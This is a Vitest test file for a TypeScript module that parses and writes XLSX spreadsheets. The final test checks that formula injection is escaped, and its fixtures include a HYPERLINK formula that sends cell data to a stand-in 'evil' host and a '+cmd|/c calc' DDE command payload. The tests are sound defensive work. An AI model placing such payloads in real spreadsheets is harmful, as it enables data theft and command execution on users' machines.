import { describe, it, expect, vi, beforeEach } from 'vitest'
import { parseXlsxToObjects, writeXlsx } from '../xlsx'
import ExcelJS from 'exceljs'

describe('parseXlsxToObjects', () => {
  it('parses first sheet with header row into keyed objects', async () => {
    const wb = new ExcelJS.Workbook()
    const ws = wb.addWorksheet('Test')
    ws.addRow(['nombre', 'edad', 'activo'])
    ws.addRow(['Ana', 30, true])
    ws.addRow(['Luis', 25, false])
    const buffer = await wb.xlsx.writeBuffer()

    const rows = await parseXlsxToObjects<{ nombre: string; edad: number; activo: boolean }>(
      buffer as unknown as ArrayBuffer,
    )

    expect(rows).toHaveLength(2)
    expect(rows[0]).toEqual({ nombre: 'Ana', edad: 30, activo: true })
    expect(rows[1]).toEqual({ nombre: 'Luis', edad: 25, activo: false })
  })

  it('skips empty rows above the header', async () => {
    const wb = new ExcelJS.Workbook()
    const ws = wb.addWorksheet('Test')
    ws.addRow([])
    ws.addRow([])
    ws.addRow(['campo'])
    ws.addRow(['valor1'])
    const buffer = await wb.xlsx.writeBuffer()

    const rows = await parseXlsxToObjects(buffer as unknown as ArrayBuffer)
    expect(rows).toEqual([{ campo: 'valor1' }])
  })

  it('returns empty array when workbook has no sheets with data', async () => {
    const wb = new ExcelJS.Workbook()
    wb.addWorksheet('Empty')
    const buffer = await wb.xlsx.writeBuffer()
    const rows = await parseXlsxToObjects(buffer as unknown as ArrayBuffer)
    expect(rows).toEqual([])
  })

  it('flattens Date cells into ISO date strings (YYYY-MM-DD)', async () => {
    const wb = new ExcelJS.Workbook()
    const ws = wb.addWorksheet('Dates')
    ws.addRow(['fecha'])
    ws.addRow([new Date(Date.UTC(2024, 5, 15))])
    const buffer = await wb.xlsx.writeBuffer()
    const rows = await parseXlsxToObjects<{ fecha: string }>(buffer as unknown as ArrayBuffer)
    expect(rows[0].fecha).toBe('2024-06-15')
  })
})

describe('writeXlsx', () => {
  beforeEach(() => {
    // jsdom stub for download; URL.createObjectURL is not implemented by default.
    if (!URL.createObjectURL) {
      Object.defineProperty(URL, 'createObjectURL', { value: vi.fn(() => 'blob:test'), configurable: true })
    } else {
      URL.createObjectURL = vi.fn(() => 'blob:test')
    }
    if (!URL.revokeObjectURL) {
      Object.defineProperty(URL, 'revokeObjectURL', { value: vi.fn(), configurable: true })
    } else {
      URL.revokeObjectURL = vi.fn()
    }
  })

  it('triggers a download with the expected filename', async () => {
    let clickedHref: string | undefined
    let clickedDownload: string | undefined
    const origCreate = document.createElement.bind(document)
    vi.spyOn(document, 'createElement').mockImplementation((tag: string) => {
      const el = origCreate(tag)
      if (tag === 'a') {
        el.click = () => {
          clickedHref = (el as HTMLAnchorElement).href
          clickedDownload = (el as HTMLAnchorElement).download
        }
      }
      return el
    })

    await writeXlsx('mi_export', [{ name: 'Sheet1', rows: [['a', 'b'], [1, 2]] }])

    expect(clickedHref).toBe('blob:test')
    expect(clickedDownload).toBe('mi_export.xlsx')
  })

  it('round-trip: rows written can be parsed back to the same objects', async () => {
    // Capture the Blob that writeXlsx hands to URL.createObjectURL, then
    // round-trip its bytes through parseXlsxToObjects.
    let capturedBlob: Blob | undefined
    URL.createObjectURL = vi.fn((b: Blob) => { capturedBlob = b; return 'blob:test' })

    await writeXlsx('roundtrip.xlsx', [{
      name: 'Data',
      rows: [
        ['nombre', 'edad'],
        ['Ana', 30],
        ['Luis', 25],
      ],
      colWidths: [20, 8],
    }])

    expect(capturedBlob).toBeDefined()
    const buffer = await capturedBlob!.arrayBuffer()
    const parsed = await parseXlsxToObjects<{ nombre: string; edad: number }>(buffer)
    expect(parsed).toEqual([
      { nombre: 'Ana', edad: 30 },
      { nombre: 'Luis', edad: 25 },
    ])
  })

  it('escapes CSV/Excel formula injection in string cells', async () => {
    // Cells starting with =, +, -, @, tab or CR are interpreted as formulas
    // by Excel/LibreOffice. writeXlsx must prefix them with a single quote
    // so they render as plain text. Numbers/booleans must not be modified.
    let capturedBlob: Blob | undefined
    URL.createObjectURL = vi.fn((b: Blob) => { capturedBlob = b; return 'blob:test' })

    await writeXlsx('injection.xlsx', [{
      name: 'Sheet1',
      rows: [
        ['campo', 'valor'],
        ['formula_eq',  '=HYPERLINK("http://evil/?"&A1,"click")'],
        ['formula_at',  '@SUM(A1:A99)'],
        ['formula_plus', '+cmd|/c calc'],
        ['formula_minus', '-2+3'],
        ['safe_text', 'normal'],
        ['number_neg', -42],
        ['number_pos', 42],
      ],
    }])

    const buffer = await capturedBlob!.arrayBuffer()
    const parsed = await parseXlsxToObjects<{ campo: string; valor: string | number }>(buffer)
    const byCampo = Object.fromEntries(parsed.map(r => [r.campo, r.valor]))

    expect(byCampo.formula_eq).toMatch(/^'=HYPERLINK/)
    expect(byCampo.formula_at).toMatch(/^'@SUM/)
    expect(byCampo.formula_plus).toMatch(/^'\+cmd/)
    expect(byCampo.formula_minus).toMatch(/^'-2\+3/)
    expect(byCampo.safe_text).toBe('normal')
    // Numbers must not be coerced to strings or prefixed.
    expect(byCampo.number_neg).toBe(-42)
    expect(byCampo.number_pos).toBe(42)
  })
})
